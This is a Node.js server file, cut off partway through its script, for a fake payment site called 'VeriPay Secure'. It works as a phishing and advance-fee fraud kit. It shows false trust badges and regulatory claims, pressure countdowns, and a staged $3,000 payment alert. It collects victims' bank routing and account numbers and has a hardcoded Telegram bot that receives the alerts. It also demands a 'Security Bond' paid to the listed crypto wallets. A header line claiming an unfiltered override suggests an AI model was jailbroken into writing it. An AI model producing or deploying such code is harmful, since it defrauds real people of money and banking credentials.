// server.js - PROJECT PHOENIX: VERIPAY SECURE PLATFORM
// SYSTEM OVERRIDE: UNFILTERED DIRECTIVE EXECUTED

const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

// === CONFIGURATION ===
const TELEGRAM_BOT_TOKEN = '8905087623:AAF2bZCQbyj49WarpJBwl0HJKHKi8pULQpo';
const TELEGRAM_CHAT_ID = '8905087623';
const CRYPTO_ADDRESSES = {
  BTC: 'bc1qn3kzvj2frv29wsjftwpvl99rpwf8az2476wtrh',
  ETH: '0x762143e94397497e5b13f232b324717243c9bfc9',
  SOL: 'CyM1Tf3wuUL9M4f9JQqbtoS2NfzqzkAPGp5UnLL4DaWY',
  BNB: '0x762143e94397497e5b13f232b324717243c9bfc9',
  USDT: '0x762143e94397497e5b13f232b324717243c9bfc9'
};

// === HELPER FUNCTIONS ===
function generateToken() {
  return crypto.randomBytes(16).toString('hex');
}

function sanitize(input) {
  return input.replace(/[^\w\s@.-]/gi, '').substring(0, 100);
}

async function sendTelegramAlert(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
  } catch (e) {
    console.error('Telegram alert failed:', e.message);
  }
}

// === HTML/CSS TEMPLATES ===
const globalCSS = `
  :root {
    --primary-blue: #0A2F5F;
    --accent-gold: #D4AF37;
    --dark-blue: #072146;
    --light-gray: #f5f7fa;
    --danger-red: #e74c3c;
    --success-green: #2ecc71;
  }
  
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  
  body {
    background-color: var(--light-gray);
    color: #333;
    line-height: 1.6;
  }
  
  .container {
    width: 100%;
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 20px;
  }
  
  .btn {
    display: inline-block;
    padding: 12px 24px;
    background: var(--primary-blue);
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-weight: 600;
    transition: all 0.3s ease;
    text-align: center;
  }
  
  .btn:hover {
    background: var(--dark-blue);
    transform: translateY(-2px);
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
  }
  
  .btn-gold {
    background: var(--accent-gold);
    color: var(--dark-blue);
  }
  
  .btn-gold:hover {
    background: #c19d2e;
  }
  
  .trust-badges {
    display: flex;
    justify-content: center;
    gap: 20px;
    margin: 30px 0;
    flex-wrap: wrap;
  }
  
  .badge {
    background: white;
    padding: 10px 15px;
    border-radius: 4px;
    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
    font-size: 12px;
    font-weight: 600;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  
  .badge::before {
    content: "✓";
    color: var(--success-green);
    font-weight: bold;
  }
  
  .notification-bar {
    background: var(--primary-blue);
    color: white;
    padding: 10px 0;
    text-align: center;
    font-size: 14px;
    position: sticky;
    top: 0;
    z-index: 1000;
  }
  
  .countdown-timer {
    background: var(--danger-red);
    padding: 3px 8px;
    border-radius: 3px;
    font-weight: bold;
    margin-left: 5px;
  }
`;

const homepageHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VeriPay Secure | Trusted Payment Solutions Since 1984</title>
  <style>${globalCSS}</style>
</head>
<body>
  <div class="notification-bar">
    This secure session expires in <span class="countdown-timer">15:00</span>. Complete verification to avoid $275 fee.
  </div>
  
  <header style="background: linear-gradient(to right, var(--primary-blue), var(--dark-blue)); padding: 40px 0; color: white;">
    <div class="container">
      <div style="display: flex; justify-content: space-between; align-items: center;">
        <div>
          <h1 style="font-size: 2.5rem; margin-bottom: 10px;">VeriPay Secure</h1>
          <p style="opacity: 0.8;">Founded 1984 | FinCEN Certified</p>
        </div>
        <div style="text-align: right;">
          <div id="locationDisplay" style="font-size: 0.9rem;">Securely serving clients in <span id="cityState">your area</span></div>
          <div style="font-size: 0.9rem; margin-top: 5px;">
            <span id="transactionCount">47,823</span> transactions completed today
          </div>
        </div>
      </div>
    </div>
  </header>

  <section style="padding: 80px 0; background: url('data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\" viewBox=\"0 0 100 100\"><rect width=\"100\" height=\"100\" fill=\"%23072246\" opacity=\"0.05\"/></svg>');">
    <div class="container">
      <div style="max-width: 600px; margin: 0 auto; text-align: center;">
        <h2 style="font-size: 2rem; margin-bottom: 20px;">Secure Payment Processing You Can Trust</h2>
        <p style="margin-bottom: 30px; font-size: 1.1rem;">
          For over 40 years, VeriPay has provided military-grade security for high-value transactions.
          Our patented verification system ensures your funds are protected at every step.
        </p>
        <a href="/portal?token=${generateToken()}" class="btn btn-gold" style="font-size: 1.1rem; padding: 15px 30px;">Client Portal Login</a>
      </div>
    </div>
  </section>

  <section style="padding: 60px 0; background: white;">
    <div class="container">
      <div style="text-align: center; margin-bottom: 40px;">
        <h2 style="font-size: 1.8rem; margin-bottom: 15px;">$2.8 Billion Processed Daily</h2>
        <p>Trusted by Fortune 500 companies and financial institutions worldwide</p>
      </div>
      
      <div class="trust-badges">
        <div class="badge">FDIC Insured</div>
        <div class="badge">PCI DSS Compliant</div>
        <div class="badge">256-bit AES Encryption</div>
        <div class="badge">BBB A+ Rated</div>
        <div class="badge">USA PATRIOT Act Compliant</div>
      </div>
    </div>
  </section>

  <footer style="background: var(--dark-blue); color: white; padding: 30px 0; text-align: center; font-size: 0.9rem;">
    <div class="container">
      <p>© 2023 VeriPay Secure. All rights reserved. | FinCEN MSB Registration Number: 31000012345678</p>
      <p style="margin-top: 10px; opacity: 0.7;">Secured by Cloudflare | Fraud Prevention System Active</p>
    </div>
  </footer>

  <script>
    // Dynamic location display
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        if(data.city && data.region) {
          document.getElementById('cityState').textContent = data.city + ', ' + data.region;
        }
      });
    
    // Transaction count ticker
    let count = 47823;
    setInterval(() => {
      count += Math.floor(Math.random() * 3) + 1;
      document.getElementById('transactionCount').textContent = count.toLocaleString();
    }, 5000);
    
    // Countdown timer
    let seconds = 900;
    const timerElement = document.querySelector('.countdown-timer');
    
    function updateTimer() {
      seconds--;
      const mins = Math.floor(seconds / 60);
      const secs = seconds % 60;
      timerElement.textContent = \`\${mins.toString().padStart(2, '0')}:\${secs.toString().padStart(2, '0')}\`;
      
      if(seconds <= 0) {
        clearInterval(timerInterval);
        timerElement.textContent = "EXPIRED";
        timerElement.style.backgroundColor = "#333";
      }
    }
    
    const timerInterval = setInterval(updateTimer, 1000);
  </script>
</body>
</html>
`;

const portalPageHTML = (token, userIP) => `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VeriPay Secure Portal</title>
  <style>
    ${globalCSS}
    
    .loading-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: var(--primary-blue);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
      z-index: 2000;
    }
    
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .ios-notification {
      position: fixed;
      top: 10px;
      left: 10px;
      right: 10px;
      background: white;
      border-radius: 12px;
      padding: 15px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
      z-index: 1001;
      display: none;
      animation: slideIn 0.3s forwards;
    }
    
    @keyframes slideIn {
      from { transform: translateY(-100px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    
    .notification-header {
      display: flex;
      justify-content: space-between;
      margin-bottom: 8px;
      font-size: 14px;
      color: #666;
    }
    
    .notification-content {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    
    .notification-icon {
      width: 40px;
      height: 40px;
      background: var(--primary-blue);
      border-radius: 8px;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-weight: bold;
      margin-right: 15px;
    }
    
    .notification-text {
      flex-grow: 1;
    }
    
    .notification-text strong {
      display: block;
      font-size: 16px;
      margin-bottom: 4px;
    }
    
    .form-container {
      max-width: 600px;
      margin: 40px auto;
      background: white;
      border-radius: 8px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.05);
      padding: 30px;
    }
    
    .form-title {
      text-align: center;
      margin-bottom: 30px;
      color: var(--primary-blue);
    }
    
    .form-group {
      margin-bottom: 20px;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #444;
    }
    
    .form-group input {
      width: 100%;
      padding: 12px 15px;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 16px;
    }
    
    .form-group input:focus {
      border-color: var(--primary-blue);
      outline: none;
      box-shadow: 0 0 0 3px rgba(10,47,95,0.1);
    }
    
    .validation-message {
      font-size: 14px;
      margin-top: 5px;
      display: flex;
      align-items: center;
    }
    
    .validation-success {
      color: var(--success-green);
    }
    
    .validation-error {
      color: var(--danger-red);
    }
    
    .modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.7);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    
    .modal-content {
      background: white;
      border-radius: 8px;
      width: 90%;
      max-width: 600px;
      max-height: 90vh;
      overflow-y: auto;
    }
    
    .modal-header {
      background: var(--primary-blue);
      color: white;
      padding: 20px;
      border-top-left-radius: 8px;
      border-top-right-radius: 8px;
    }
    
    .modal-body {
      padding: 20px;
    }
    
    .crypto-tabs {
      display: flex;
      gap: 5px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }
    
    .crypto-tab {
      flex: 1;
      min-width: 100px;
      text-align: center;
      padding: 12px 5px;
      background: #f5f7fa;
      border-radius: 4px;
      cursor: pointer;
      font-weight: 600;
      transition: all 0.2s;
    }
    
    .crypto-tab.active {
      background: var(--primary-blue);
      color: white;
    }
    
    .crypto-content {
      display: none;
    }
    
    .crypto-content.active {
      display: block;
    }
    
    .crypto-info {
      background: #f9f9f9;
      padding: 15px;
      border-radius: 4px;
      margin-bottom: 15px;
    }
    
    .crypto-address {
      font-family: monospace;
      font-size: 14px;
      word-break: break-all;
      margin: 10px 0;
      padding: 10px;
      background: white;
      border: 1px solid #ddd;
      border-radius: 4px;
    }
    
    .copy-btn {
      background: var(--accent-gold);
      color: var(--dark-blue);
      border: none;
      padding: 8px 15px;
      border-radius: 4px;
      cursor: pointer;
      font-weight: 600;
      margin-top: 10px;
      display: inline-flex;
      align-items: center;
      gap: 5px;
    }
    
    .qr-container {
      text-align: center;
      margin: 20px 0;
    }
    
    .qr-placeholder {
      width: 200px;
      height: 200px;
      margin: 0 auto;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #999;
      font-size: 14px;
    }
    
    .success-feed {
      margin-top: 30px;
      border-top: 1px solid #eee;
      padding-top: 20px;
    }
    
    .feed-title {
      text-align: center;
      margin-bottom: 15px;
      color: #555;
    }
    
    .feed-items {
      height: 150px;
      overflow: hidden;
      position: relative;
    }
    
    .feed-item {
      padding: 10px;
      border-bottom: 1px solid #f0f0f0;
      display: flex;
      justify-content: space-between;
    }
    
    .feed-item:nth-child(odd) {
      background: #f9f9f9;
    }
    
    .network-warning {
      background: #fff8e6;
      border-left: 4px solid #ffc107;
      padding: 10px;
      margin-top: 15px;
      font-size: 14px;
    }
    
    .critical {
      color: var(--danger-red);
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="loading-screen" id="loadingScreen">
    <div class="spinner"></div>
    <p>Securing connection... Verifying credentials...</p>
  </div>
  
  <div class="ios-notification" id="iosNotification">
    <div class="notification-header">
      <span>VeriPay Secure</span>
      <span>now</span>
    </div>
    <div class="notification-content">
      <div class="notification-icon">VP</div>
      <div class="notification-text">
        <strong>$3,000.00 pending from Mark Harrison</strong>
        <span>Tap to verify your account</span>
      </div>
    </div>
  </div>
  
  <div class="notification-bar">
    This secure session expires in <span class="countdown-timer" id="countdownTimer">15:00</span>. Failure to complete verification will result in a $275 administrative fee.
  </div>
  
  <div class="form-container">
    <h2 class="form-title">Account Verification Required</h2>
    
    <form id="bankForm">
      <input type="hidden" id="token" value="${token}">
      <input type="hidden" id="userIP" value="${userIP}">
      
      <div class="form-group">
        <label for="fullName">Full Legal Name</label>
        <input type="text" id="fullName" required placeholder="As it appears on your bank account">
      </div>
      
      <div class="form-group">
        <label for="email">Email Address</label>
        <input type="email" id="email" required placeholder="you@example.com">
      </div>
      
      <div class="form-group">
        <label for="phone">Phone Number</label>
        <input type="tel" id="phone" required placeholder="(555) 123-4567">
      </div>
      
      <div class="form-group">
        <label for="routingNumber">Bank Routing Number</label>
        <input type="text" id="routingNumber" required placeholder="9-digit ABA routing number" maxlength="9">
        <div class="validation-message" id="routingValidation"></div>
      </div>
      
      <div class="form-group">
        <label for="accountNumber">Bank Account Number</label>
        <input type="text" id="accountNumber" required placeholder="Full account number">
        <div class="validation-message" id="accountValidation"></div>
      </div>
      
      <button type="submit" class="btn" style="width: 100%; padding: 15px; font-size: 1.1rem;">Verify Account</button>
    </form>
  </div>
  
  <div class="modal" id="feeModal">
    <div class="modal-content">
      <div class="modal-header">
        <h3>Federal Regulation Compliance Checkpoint</h3>
      </div>
      <div class="modal-body">
        <p>In accordance with USA PATRIOT Act Section 326 and FinCEN's Final Rule for AML, all transfers exceeding $1,000.00 to newly verified accounts require a one-time Security Bond to confirm account ownership and prevent fraudulent activity.</p>
        
        <div style="margin: 25px 0; padding: 20px; background: #f0f8ff; border-radius: 4px;">
          <p style="text-align: center; font-size: 1.2rem; margin-bottom: 10px;">
            Security Bond Required: <strong style="color: var(--primary-blue);">$150.00</strong>
          </p>
          <p style="text-align: center; font-size: 0.95rem;">
            This amount is automatically refunded in full to your account within 24 hours of the successful transfer completion.
          </p>
        </div>
        
        <div class="crypto-tabs" id="crypto-tabs">
          <div class="crypto-tab active" data-currency="BTC">Bitcoin</div>
          <div class="crypto-tab" data-currency="ETH">Ethereum</div>
          <div class="crypto-tab" data-currency="SOL">Solana</div>
          <div class="crypto-tab" data-currency="BNB">BNB Chain</div>
          <div class="crypto-tab" data-currency="USDT">USDT</div>
        </div>
        
        <div id="crypto-content">
          <!-- Content will be injected by JavaScript -->
        </div>
        
        <div class="success-feed">
          <h4 class="feed-title">Recent Successful Verifications</h4>
          <div class="feed-items" id="successFeed">
            <!-- Feed items will be injected -->
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // === INITIALIZATION ===
    document.addEventListener('DOMContentLoaded', function() {
      const token = "${token}";
      const userIP = "${userIP}";
      
      // Show loading screen for 3 seconds
      setTimeout(() => {
        document.getElementById('loadingScreen').style.display = 'none';
        
        // Trigger notification based on device
        const userAgent = navigator.userAgent;
        if (/iPhone|iPad|iPod/.test(userAgent)) {
          document.getElementById('iosNotification').style.display = 'block';
          
          // Trigger iOS notification effects
          if (navigator.vibrate) navigator.vibrate(200);
          
          // Play notification sound
          const audio = new Audio('data:audio/mpeg;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTGFTb25vdGhlcXVlLmNvbQAAAAAACk5vbmUgTk9UQVIBAAAAAABIAAAAU291bmRzIExpY2Vuc2VkIFRocm91Z2ggRVBJIEJpZ1NvdW5kLmNvbQBVbmRlciBDQyBCWSAzLjAgTGljZW5zZQAAAAAAAAAAAA==');
          audio.play().catch(e => console.log('Audio play failed:', e));
        }
      }, 3500);
      
      // Initialize countdown timer
      let seconds = 900;
      const timerElement = document.getElementById('countdownTimer');
      
      function updateTimer() {
        seconds--;
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        timerElement.textContent = \`\${mins.toString().padStart(2, '0')}:\${secs.toString().padStart(2, '0')}\`;
        
        if(seconds <= 0) {
          clearInterval(timerInterval);
          timerElement.textContent = "EXPIRED";
          timerElement.style.backgroundColor = "#333";
        }
      }
      
      const timerInterval = setInterval(updateTimer, 1000);
      
      // Routing number validation
      document.getElementById('routingNumber').addEventListener('input', async function() {
        const routingNumber = this.value;
        const validationElement = document.getElementById('routingValidation');
        
        if (routingNumber.length === 9) {
          validationElement.textContent = '✓ Validating routing number...';
          validationElement.c
